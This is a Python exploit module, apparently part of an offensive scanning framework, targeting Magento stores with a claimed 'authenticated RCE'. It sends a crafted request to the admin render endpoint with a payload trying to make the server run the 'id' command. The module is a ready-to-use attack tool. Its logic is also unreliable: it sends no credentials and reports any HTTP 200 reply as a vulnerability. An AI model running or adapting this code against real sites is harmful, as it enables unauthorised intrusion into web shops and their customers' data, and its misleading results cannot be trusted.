import requests
from core.printmodels import *

class Magento_RCE_Exploit:
    def __init__(self):
        self.name = "Magento RCE"
        self.description = "Magento 2.3.x-2.4.x Authenticated RCE"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            endpoint = f"{site}/admin/mui/index/render/"
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest"
            }
            payload = "namespace=&class=Magento%5CFramework%5CImage%5CAdapter%5CImagick&method=watermark&args[0]=id&args[1]=id"
            
            response = requests.post(endpoint, data=payload, headers=headers, verify=False, timeout=10)
            if response.status_code == 200:
                return PrintSuccess(f"[Magento] Potentially vulnerable to RCE!")
            return PrintFailed("[Magento] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Magento] Error: {str(e)}")
